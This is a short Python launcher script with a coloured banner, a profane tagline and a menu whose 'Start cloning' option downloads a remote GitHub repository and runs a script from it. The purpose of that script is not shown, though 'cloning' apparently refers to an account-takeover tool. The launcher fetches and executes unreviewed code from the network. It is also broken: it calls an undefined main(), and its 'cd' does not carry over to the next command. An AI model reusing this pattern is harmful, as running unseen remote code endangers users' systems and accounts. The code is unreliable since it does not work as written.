import requests

from requests.structures import CaseInsensitiveDict

import os

import sys

import time

os.system("pip install requests")

os.system("clear")
print("""\33[93m███╗   ███╗ █████╗██╗  ██╗██████╗ ██╗     \n\033[91m███╗ ████║██╔══██╗██║  ██║██╔══██╗██║    \n\033[1;32m██╔████╔██║███████║███████║██║  ██║██║   \n\33[97m██║╚██╔╝██║██╔══██║██╔══██║██║  ██║██║    \n\033[96m██║ ╚═╝ ██║██║  ██║██║  ██║██████╔╝██║    \n\033[0;35m╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝\033[0m 
\033[0m================================================================
\33[93mAUTHOR :\033[91m[MAHDI HASAN] SHUVO
\033[0;33mGITHUB : \033[1;97mhttps://github.com/Shuvo-BBHH
WELL COME SYLHET GAMG (IAM NEW MEMBER IN YOUR GRUP)
LIVE in Sylhet (Read in class 10)
\033[42mNo NEED GF \033[0;31mIF YOU LOVE ME I LOVE YOU IF U HAT ME I FUCK YOU 
================================================================""")
print("""
\033[0;36m[1] Start cloning
\033[0;88m[2]GO BACK""")
pil = input("\033[1;97m[\033[1;94m?\033[1;97m] CHOOSE: ")

if pil in ["01", "1"]:

    os.system('git clone https://github.com/Shuvo-BBHH/texs && cd texs')
    os.system('python mahdi.py')
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
    main()

elif pil in ["02", "2"]:  
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
    main()
